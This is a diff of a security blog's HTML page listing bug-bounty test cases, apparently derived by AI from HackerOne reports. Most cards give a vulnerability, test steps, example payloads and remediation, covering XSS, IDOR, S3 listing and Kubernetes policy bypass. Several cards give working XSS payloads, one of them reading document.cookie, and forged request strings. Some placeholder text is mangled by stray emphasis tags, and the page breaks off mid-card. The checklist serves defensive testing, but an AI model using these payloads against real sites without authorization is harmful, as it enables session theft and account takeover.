@@ -3,7 +3,20 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Bug Bounty Test Case Library</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta name="description" content="Practical Cybersecurity Blog"/>
+  <meta name="keywords" content="cybersecurity, infosec, bug-bounty, bugbounty, SOC, CTI, VM, Pentest, Cyber Defense"/>
+  <title>Bug Bounty Test Case Library | Cyber Frogy</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css"/>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+  <link rel="stylesheet" href="/css/main.css"/>
+  <link rel="stylesheet" href="/css/custom.css"/>
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/>
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/>
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/>
+  <link rel="manifest" href="/site.webmanifest"/>
+  <meta name="theme-color" content="#050b1d"/>
   <style>
     :root {
       color-scheme: dark;
@@ -24,12 +37,75 @@
       background: var(--bg);
       color: var(--text);
     }
+    body::before {
+      display: none;
+    }
     .shell {
       width: 100%;
       max-width: none;
       margin: 0 auto;
-      padding: 30px 5% 60px;
+      padding: 30px 0 60px;
       box-sizing: border-box;
+    }
+    .page-shell {
+      gap: 2rem;
+    }
+    .site-nav,
+    .site-footer {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow);
+    }
+    .site-nav {
+      border-radius: 999px;
+      margin-bottom: 24px;
+    }
+    .site-footer {
+      border-radius: 24px;
+      margin-top: 40px;
+      padding: 32px 24px;
+      text-align: center;
+    }
+    .site-footer__copy {
+      color: var(--muted);
+      margin: 12px 0 18px;
+    }
+    .site-footer__nav {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      justify-content: center;
+    }
+    .site-footer__link {
+      color: var(--muted);
+      font-size: 0.8rem;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .site-footer__link:hover {
+      color: var(--accent);
+    }
+    .site-nav .site-brand,
+    .site-nav .site-brand:visited,
+    .site-nav .site-brand:focus,
+    .site-nav .site-menu__link,
+    .site-nav .site-menu__link:visited,
+    .site-menu__drawer .site-menu__link {
+      color: var(--text) !important;
+    }
+    .site-nav .site-brand:hover,
+    .site-nav .site-brand:focus-visible,
+    .site-nav .site-menu__link:hover,
+    .site-nav .site-menu__link:focus-visible,
+    .site-menu__drawer .site-menu__link:hover {
+      color: var(--accent) !important;
+    }
+    .site-nav .site-menu__toggle {
+      color: var(--text);
+    }
+    header h1,
+    header p {
+      color: var(--text);
     }
     header {
       text-align: center;
@@ -110,6 +186,7 @@
     .analytics-panel h2 {
       margin: 0 0 12px;
       font-size: 1.2rem;
+      color: var(--text);
     }
     .analytics-row {
       margin-bottom: 12px;
@@ -266,8 +343,46 @@
     }
   </style>
 </head>
-<body>
-  <div class="shell">
+<body lang="en-US" class="is-page" data-theme="dark">
+  <div class="container my-auto">
+    <div class="site-nav">
+      <div class="site-nav__inner">
+        <a class="site-brand" href="/">
+          <span class="site-brand__mark"></span>
+          <span class="site-brand__text">Cyber Frogy</span>
+        </a>
+        <nav class="site-menu d-none d-md-flex">
+          <a class="site-menu__link" href="/">Home</a>
+          <a class="site-menu__link" href="/whoami">Whoami</a>
+          <a class="site-menu__link" href="/posts">Blog</a>
+          <a class="site-menu__link" href="/mindmaps">Mindmaps</a>
+          <a class="site-menu__link" href="/threat-actor-db">Threat-Actor DB</a>
+          <a class="site-menu__link" href="/github">GitHub</a>
+          <a class="site-menu__link" href="/checklists">Checklists</a>
+          <a class="site-menu__link" href="/kickstartcareer">Kickstart Career</a>
+          <a class="site-menu__link" href="/disclaimer">Disclaimer</a>
+        </nav>
+        <div class="site-nav__actions">
+          <button class="navbar-toggler site-menu__toggle d-md-none" type="button" data-bs-toggle="collapse" data-bs-target="#site-menu-drawer" aria-controls="site-menu-drawer" aria-expanded="false" aria-label="Toggle navigation">
+            <i class="fa-solid fa-bars"></i>
+          </button>
+        </div>
+      </div>
+      <div class="collapse site-menu__drawer d-md-none" id="site-menu-drawer">
+        <nav class="d-flex flex-column gap-2">
+          <a class="site-menu__link" href="/">Home</a>
+          <a class="site-menu__link" href="/whoami">Whoami</a>
+          <a class="site-menu__link" href="/posts">Blog</a>
+          <a class="site-menu__link" href="/mindmaps">Mindmaps</a>
+          <a class="site-menu__link" href="/threat-actor-db">Threat-Actor DB</a>
+          <a class="site-menu__link" href="/github">GitHub</a>
+          <a class="site-menu__link" href="/checklists">Checklists</a>
+          <a class="site-menu__link" href="/kickstartcareer">Kickstart Career</a>
+          <a class="site-menu__link" href="/disclaimer">Disclaimer</a>
+        </nav>
+      </div>
+    </div>
+    <main class="page-shell shell">
     <header>
       <h1>Reusable HackerOne Test Cases</h1>
       <p>Every report from HackerOne is analysed by local AI (Ollama) and generic test case has been derrived to be used as a checklist to test other websites.</p>
@@ -276,7 +391,7 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">40</div>
+        <div class="metric-value">76</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
@@ -288,7 +403,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>20</span></div>
+      <div class="analytics-label">Web App <span>36</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -296,17 +411,25 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">API <span>15</span></div>
+      <div class="analytics-label">API <span>29</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:75%"></div>
+        <div class="analytics-bar-fill" style="width:81%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>5</span></div>
+      <div class="analytics-label">Network <span>9</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:25%"></div>
+      </div>
+    </div>
+    
+
+    <div class="analytics-row">
+      <div class="analytics-label">Source Code <span>2</span></div>
+      <div class="analytics-bar">
+        <div class="analytics-bar-fill" style="width:6%"></div>
       </div>
     </div>
     
@@ -320,10 +443,11 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (40)</option>
-          <option value="Web App">Web App (20)</option>
-<option value="API">API (15)</option>
-<option value="Network">Network (5)</option>
+          <option value="all">All Categories (76)</option>
+          <option value="Web App">Web App (36)</option>
+<option value="API">API (29)</option>
+<option value="Network">Network (9)</option>
+<option value="Source Code">Source Code (2)</option>
         </select>
       </div>
     </section>
@@ -1559,7 +1683,1143 @@ int main() {
       </div>
     </article>
     
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Completed Pods Bypass Kubernetes NetworkPolicy</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Kubernetes NetworkPolicy rules can be bypassed if completed pods retain their IP addresses, allowing other pods to inherit unintended network access. This occurs when a pod finishes execution but its associated firewall rules are not immediately removed, potentially granting unauthorized access to other pods that are later assigned the same IP address.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Deploy a Kubernetes application that uses NetworkPolicy to restrict access.</li>
+<li>Create a &quot;completion&quot; pod that is granted access via NetworkPolicy.</li>
+<li>Ensure the &quot;completion&quot; pod finishes its execution and transitions to a &quot;Completed&quot; state.</li>
+<li>Deploy another pod that is <em>not</em> granted access via NetworkPolicy.</li>
+<li>Observe whether the unauthorized pod can successfully connect to the target application (e.g., using <code>curl -v &lt;TARGET_URL&gt;</code>).  A successful connection indicates a bypass.</li>
+<li>Examine network configurations and IP address assignments to confirm if the unauthorized pod received the IP address previously held by the completed pod.</li>
+</ol>
+<p>Example Payload: <code>curl -v &lt;TARGET_URL&gt;</code></p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized network access, potentially leading to data breaches or service disruption.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that when a pod completes, its associated firewall rules are promptly removed or updated to prevent IP address conflicts and unauthorized access. Use mechanisms that dynamically update NetworkPolicy rules upon pod completion or deletion.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Publicly Listable S3 Bucket Disclosure</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A publicly listable Amazon S3 bucket can expose configuration and JSON files, potentially revealing sensitive information or internal system details. This vulnerability allows unauthorized access to bucket contents and metadata, which can be exploited for reconnaissance or further attacks. It&#x27;s critical to prevent unintentional public access to such resources.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Attempt to list the contents of a suspected S3 bucket using a tool like <code>curl</code>:</li>
+</ol>
+<pre><code>curl &lt;TARGET_URL&gt;</code></pre>
+<p>(e.g., <code>curl https://&lt;BUCKET_NAME&gt;.s3.amazonaws.com/</code>)</p>
+<ol>
+<li>Examine the response to determine if an XML <code>ListBucketResult</code> is returned, indicating that the bucket is publicly listable.</li>
+<li>Check the <code>Contents</code> entries within the XML response for JSON or configuration files.</li>
+<li>Analyze the filenames and timestamps of listed files to gather potentially sensitive information about the target system.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exposure of internal configuration, API endpoints, feature flags, versioning information, and potentially sensitive credentials if the JSON files contain them.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Review S3 bucket permissions and ACLs, restrict <code>ListBucket</code> access, implement least-privilege access, rotate any leaked credentials, and consider serving public assets through a hardened CDN.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unauthorized Email Address Modification</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can modify the email address of other users, including administrators, without proper authentication. This allows an attacker to potentially take over accounts or disrupt access control mechanisms. The application fails to enforce authentication checks when updating user email addresses via a direct POST request.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Log in to the application&#x27;s administrative interface.</li>
+<li>Navigate to the user management section.</li>
+<li>Intercept a request that appears to modify a user&#x27;s details, such as a POST request to <code>/admin/agency-user.php</code>.</li>
+<li>Modify the request payload to change the <code>email<em>address</code> parameter, like this: <code>submit=1&amp;login=admin&amp;token=&lt;TOKEN&gt;&amp;userid=&lt;USER</em>ID&gt;&amp;email<em>address=new-email@example.com&amp;agencyid=&lt;AGENCY</em>ID&gt;</code>.  Replace <code>&lt;TOKEN&gt;</code>, <code>&lt;USER<em>ID&gt;</code>, and <code>&lt;AGENCY</em>ID&gt;</code> with appropriate values.</li>
+<li>Send the modified request and observe whether the email address changes successfully without requiring password confirmation.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker with minimal privileges can modify user accounts, potentially enabling account takeover or unauthorized access.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authentication checks before allowing email address modifications.  Require re-authentication or multi-factor authentication to ensure the request is authorized.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Reflected Cross-Site Scripting (RXSS)</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious scripts into a web page viewed by other users. The script executes in the context of the affected user&#x27;s browser, potentially leading to unauthorized actions or data theft. Improper sanitization of user-supplied data is the root cause.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Craft a URL with a <code>group</code> parameter containing a malicious payload.</li>
+<li>Navigate to the constructed URL in a web browser.</li>
+<li>Observe if the injected script executes.</li>
+<li>Use payloads like <code>&lt;script&gt;alert(9645)&lt;/script&gt;</code> or <code>alert(1)</code> within the <code>group</code> parameter:  <code>&lt;TARGET<em>URL&gt;?group=&lt;PAYLOAD&gt;</code>. Example: <code>&lt;TARGET</em>URL&gt;?group=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>If a JavaScript alert box appears, it confirms the vulnerability.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript within the victim&#x27;s browser, leading to session hijacking, unauthorized data access, or redirection to malicious websites.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Properly encode or escape user-supplied input before displaying it in the browser. Use a content security policy (CSP) to restrict the sources from which scripts can be loaded.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stored Cross-Site Scripting (XSS) via Input Sanitization Failure</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can inject malicious scripts into application settings, which are then rendered to other users without proper sanitization. This can lead to a denial-of-service or other client-side attacks, impacting user experience and potentially compromising user accounts. Improper output encoding allows persisted data to execute JavaScript.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the application settings page at <code>&lt;TARGET_URL&gt;/admin/settings</code>.</li>
+<li>Locate fields for user-defined names or descriptions (e.g., &quot;From Name&quot; or &quot;Company Name&quot;).</li>
+<li>Enter the following payload into the field: <code>&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code>.</li>
+<li>Submit the form and save the changes.</li>
+<li>Observe whether the script executes when the settings page or any other page containing the settings is viewed by other users.</li>
+<li>Observe the effect when a user views any page which includes the field values from the settings, particularly in admin sections.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can disrupt website functionality, redirect users, or potentially steal sensitive information if cookies or sessions are not properly protected.  A denial of service is possible.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper input sanitization and output encoding. Escape user-controlled data before rendering it in HTML. Use a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stored XSS</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious scripts into a website, which are then stored and executed when other users visit the affected page. Stored XSS can lead to account compromise, data theft, or redirection to malicious websites. It is a significant security risk that needs immediate attention.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the inventory management section of the application.</li>
+<li>Locate the campaign creation or editing form.</li>
+<li>Inject a malicious payload into the &quot;Name&quot; field, such as: <code>`</code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;<code>`</code>.</li>
+<li>Submit the form.</li>
+<li>Navigate to a page that displays the inventory data, such as <code>&lt;TARGET_URL&gt;?clientid=&lt;PARAMETER&gt;</code>.</li>
+<li>Verify that the injected script executes, for example, by checking for an alert box.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript code in the context of the user&#x27;s browser, potentially stealing session cookies, redirecting the user to a malicious site, or defacing the website.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper input validation and output encoding on all user-supplied data. Use a Content Security Policy (CSP) to restrict the sources from which scripts can be loaded.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stored XSS via Tracker Name in Conversion Statistics</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can inject malicious JavaScript into tracker names, which are then stored and executed when an administrator views conversion statistics. This allows for potential session cookie theft and privilege escalation. The stored nature of the XSS makes it a persistent threat.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Login to the application as a user with advertiser privileges.</li>
+<li>Navigate to the tracker management section for your advertiser account.</li>
+<li>Create a new tracker and set the tracker name to a malicious JavaScript payload, such as: <code>&lt;img src=x onerror=&quot;alert(&#x27;XSS: &#x27; + document.cookie)&quot;&gt;</code>.</li>
+<li>Login to the application as an administrator.</li>
+<li>Navigate to the conversion statistics page, specifying a client ID: <code>&lt;TARGET<em>URL&gt;?clientid=&lt;CLIENT</em>ID&gt;</code>.</li>
+<li>Observe if the malicious JavaScript payload executes in the administrator&#x27;s browser context.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially steal administrator session cookies, leading to account takeover and full control of the application.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper input validation and output encoding (e.g., <code>htmlspecialchars()</code> in PHP) for all user-controlled data displayed in reports or administrative interfaces. Regularly audit all data display code for XSS vulnerabilities.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Information Disclosure via User Lookup</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an unprivileged user to discover Personally Identifiable Information (PII) of other users belonging to different accounts. The application performs a global user search instead of restricting the scope to the current account, enabling unauthorized access to user details. This presents a risk of privacy breach and potential misuse of disclosed information.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Log in as a user belonging to <code>Account A</code>.</li>
+<li>Navigate to the user management section (e.g., <code>User Access</code>).</li>
+<li>Initiate a user search or add user form.</li>
+<li>Enter the username of a user belonging to <code>Account B</code> in the username field.</li>
+<li>Observe the response: verify that the system returns and displays the contact name and email address of the user in <code>Account B</code>. Example payload: <code>testuser</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exposure of Personally Identifiable Information (PII) of users belonging to other accounts, potentially leading to privacy violations and misuse of information.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement account-based user scoping during user lookups. Ensure that user search results are restricted to the current user&#x27;s account or authorized scope only. Validate user permissions before displaying user details.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Insecure Direct Object Reference (IDOR) - Banner Deletion</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to delete banners belonging to other users without proper authorization. This can result in significant disruption to ad campaigns and potential revenue loss for the affected users. The lack of ownership verification on banner deletion endpoints poses a security risk.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Log in as a user with sufficient privileges (e.g., a Manager account).</li>
+<li>Identify the banner deletion endpoint on the target application (e.g., <code>/www/admin/banner-delete.php</code>).</li>
+<li>Obtain a valid CSRF token for the current session.</li>
+<li>Identify the banner ID of another user (the victim).</li>
+<li>Construct a malicious URL using the following format: <code>&lt;TARGET<em>URL&gt;?token=&lt;CSRF</em>TOKEN&gt;&amp;clientid=&lt;YOUR<em>CLIENT</em>ID&gt;&amp;campaignid=&lt;YOUR<em>CAMPAIGN</em>ID&gt;&amp;bannerid=&lt;VICTIM<em>BANNER</em>ID&gt;</code></li>
+</ol>
+<ul>
+<li>Example: <code>http://localhost:8080/www/admin/banner-delete.php?token=9fec0e8e46e9eb237d67d3da6e3e615b&amp;clientid=100&amp;campaignid=100&amp;bannerid=2001</code></li>
+</ul>
+<ol>
+<li>Send a request to the constructed URL via a browser or HTTP client.</li>
+<li>Verify if the victim&#x27;s banner has been deleted without proper authorization.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized deletion of banners, campaign sabotage, revenue loss, reputational damage, and potential data integrity violations.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust access controls to ensure that users can only access and modify resources they own. Validate ownership before performing any deletion operations. Use proper CSRF protection measures and ensure adequate input validation.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Verbose Error Messages Leak Sensitive Information</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Detailed error messages can inadvertently expose sensitive backend information, such as database versions and SQL queries. Attackers can leverage this information to identify vulnerabilities or craft targeted attacks. This test focuses on exploiting verbose error messages to gather sensitive information.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to <code>&lt;TARGET_URL&gt;/admin/channel-acl.php?affiliateid=&lt;&lt;id&gt;&gt;&amp;channelid=&lt;&lt;id&gt;&gt;</code>.</li>
+<li>Add a new client language entry.</li>
+<li>Enter a single quote (<code>&#x27;</code>) in the &quot;Execution order&quot; field.</li>
+<li>Submit the form and observe the detailed error output.</li>
+<li>Examine the error message for any sensitive information, like database version or SQL query details.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exposure of backend details may help attackers identify known vulnerabilities or tailor attacks against the server.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust error handling and avoid displaying verbose error messages in production environments. Utilize logging mechanisms for debugging and error analysis, ensuring sensitive details are not exposed to users.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Reflected XSS</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious scripts into a web application. The injected script executes in the context of a user&#x27;s browser, potentially leading to unauthorized actions or data theft. Proper input sanitization is crucial to prevent this type of attack.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to a page where user input is reflected in the response (e.g., <code>&lt;TARGET_URL&gt;/admin/banner-zone.php</code>).</li>
+<li>Locate a parameter or input field (e.g., &quot;Website&quot; search field).</li>
+<li>Enter a simple XSS payload into the field: <code>&lt;PAYLOAD&gt;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;</code>.</li>
+<li>Observe the response. If the JavaScript code executes (e.g., an alert box appears), the vulnerability is present.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript in the victim&#x27;s browser, potentially leading to session hijacking, credential theft, or unauthorized actions.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and context-aware output encoding to prevent injection of malicious scripts. Use a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stored XSS via Banner Name Field</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A stored Cross-Site Scripting (XSS) vulnerability exists when user-supplied data is stored and later displayed without proper sanitization. An attacker can inject malicious scripts that execute in the context of other users&#x27; sessions, leading to potential data theft or account compromise. This demonstrates a failure to properly sanitize user input before storing it in a database and displaying it to other users.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the banner creation or editing page.</li>
+<li>In the &quot;Name&quot; field, enter the following payload: <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>.</li>
+<li>Save the banner.</li>
+<li>Add a test user and grant them access to the banner.</li>
+<li>Log in as the test user and verify that the injected script executes.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Malicious JavaScript code can be executed in the context of other users&#x27; sessions, potentially leading to unauthorized data access, modification, or account takeover.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper input sanitization and output encoding to prevent XSS vulnerabilities. Use a web application firewall (WAF) to filter out malicious input and always validate user input.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stored XSS in Campaign Name</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can inject malicious code into campaign names through a user interface element. This code is then stored and later displayed without proper sanitization, allowing for cross-site scripting (XSS) when viewed by users with higher privileges. This can lead to account takeover or unauthorized actions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>As an authenticated user, enter the following payload in the campaign name field: <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code></li>
+<li>Save the campaign.</li>
+<li>As a user with administrator privileges, navigate to the banner picker or similar feature displaying campaign names.</li>
+<li>Observe whether the payload executes, triggering an alert box or other malicious action.</li>
+<li>Example payload: <code>&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker with a normal user account can execute arbitrary JavaScript in the browser of an administrator user, potentially leading to account compromise or unauthorized actions.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper HTML escaping or input sanitization when storing and displaying user-supplied data, especially in contexts where it might be rendered in an administrator’s view. Use a Content Security Policy (CSP) to restrict the execution of inline scripts.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Visually Indistinguishable Usernames</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Usernames with leading or trailing whitespace can create visually identical accounts to legitimate users. This can cause confusion during administrative tasks, complicate auditing, and potentially be exploited for social engineering attacks. It does not directly grant privileges, but obscures accountability.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the user management section of the target application.</li>
+<li>Create a new user account.</li>
+<li>Enter a username containing leading or trailing whitespace, such as <code>&quot; admin&quot;</code> or <code>&quot;admin &quot;</code>.</li>
+<li>Verify that the new user&#x27;s display name in the user list is visually indistinguishable from usernames without whitespace. Example payload: <code>&quot; admin&quot;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Confusion of user identities, potential for social engineering attacks, and difficulties in auditing user actions.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Normalize usernames by stripping leading and trailing whitespace before display and storage to ensure visual consistency.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unrestricted Pagination Size</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
